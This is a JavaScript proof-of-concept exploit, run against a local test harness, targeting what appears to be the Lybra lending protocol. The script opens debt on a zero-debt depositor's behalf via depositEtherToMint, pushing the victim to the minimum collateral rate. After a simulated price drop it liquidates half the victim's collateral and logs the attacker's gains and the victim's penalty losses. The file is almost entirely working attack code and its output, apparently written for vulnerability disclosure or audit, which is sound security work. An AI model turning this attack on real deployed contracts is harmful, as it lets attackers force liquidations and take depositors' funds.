const { setup, E, addr } = require('./harness');
const f = (x, d = 18n) => (Number(x * 1000n / (10n ** d)) / 1000).toString();

(async () => {
  const t = await setup({ price: 2000n * E });
  const victim = addr(0x1C70), att = addr(0xA77AC), prov = addr(0x9809);
  for (const a of [victim, att, prov]) { await t.fund(a, 100000n * E); await t.stMint(a, 10000n * E); await t.stApprove(a, t.lybra, 1n << 255n); }

  console.log('--- setup: victim is a PURE DEPOSITOR, 100 ETH collateral, ZERO debt ---');
  await t.depositEther(victim, victim, 0, 100n * E);
  console.log('victim deposited:', f(await t.deposited(victim)), 'ETH   borrowed:', f(await t.borrowed(victim)), 'eUSD');
  console.log('victim has NO liquidation exposure at all (borrowed == 0 => liquidation() divides by zero)');
  try { await t.liquidate(att, prov, victim, 1n * E); } catch (e) { console.log('  liquidation(victim) ->', e.message); }

  console.log('\n--- attack: anyone calls depositEtherToMint(victim, mintAmount) with 1 ETH ---');
  // max mintable keeping victim at exactly safeCollateralRate 160%: (100+1)*2000/1.6
  const maxMint = (101n * E * 2000n * 100n) / 160n / 1n;   // = (collateral*price*100)/160  in 1e18
  const mintAmount = (101n * 2000n * 100n * E) / 160n;
  await t.depositEther(att, victim, mintAmount, 1n * E);
  const dep = await t.deposited(victim), bor = await t.borrowed(victim);
  const rate = (dep * 2000n * E * 100n) / bor;   // 1e20 == 100%
  console.log('attacker spent: 1 ETH (gifted into victim\'s collateral)');
  console.log('victim deposited:', f(dep), 'ETH   borrowed:', f(bor), 'eUSD   eUSD balance:', f(await t.eusdBal(victim)));
  console.log('victim collateral rate now:', (Number(rate / 10n**16n)/100).toFixed(2), '%  <-- forced to the 160.00% floor, from infinite');

  console.log('\n--- 6.25% price drop pushes the victim under badCollateralRate (150%) ---');
  await t.setPrice(1870n * E);                      // -6.5%
  const rate2 = (dep * 1870n * E * 100n) / bor;
  console.log('victim rate at $1870:', (Number(rate2 / 10n**16n)/100).toFixed(2), '% -> below badCollateralRate(150%):', rate2 < 150n*E);

  // attacker funds a liquidation provider position and liquidates the victim
  await t.depositEther(prov, prov, 0, 2000n * E);
  await t.mint(prov, prov, 1000000n * E);
  await t.approveEUSD(prov, t.lybra, 1n << 200n);
  const attStBefore = await t.stBal(att), provEusdBefore = await t.eusdBal(prov), provStBefore = await t.stBal(prov);
  const half = dep / 2n;
  await t.liquidate(att, prov, victim, half);
  console.log('\n--- after liquidation of 50% of the victim\'s collateral ---');
  console.log('keeper (attacker) stETH gained :', f((await t.stBal(att)) - attStBefore), 'stETH');
  console.log('provider stETH gained          :', f((await t.stBal(prov)) - provStBefore), 'stETH');
  console.log('provider eUSD spent            :', f(provEusdBefore - (await t.eusdBal(prov))), 'eUSD');
  console.log('victim collateral remaining    :', f(await t.deposited(victim)), 'ETH (was', f(dep), ')');
  console.log('victim collateral LOST to the 10% liquidation penalty:', f(dep - (await t.deposited(victim)) - half), 'ETH');

  console.log('\n--- can the victim undo the forced position before the price moves? ---');
  const t2 = await setup({ price: 2000n * E });
  for (const a of [victim, att]) { await t2.fund(a, 100000n * E); }
  await t2.depositEther(victim, victim, 0, 100n * E);
  await t2.depositEther(att, victim, mintAmount, 1n * E);
  await t2.burn(victim, victim, await t2.borrowed(victim));
  console.log('victim burn(self, fullDebt) ->  borrowed now:', f(await t2.borrowed(victim)), ' eUSD left:', f(await t2.eusdBal(victim)));
})().catch(e => { console.error('ERR', e.message); process.exit(1); });
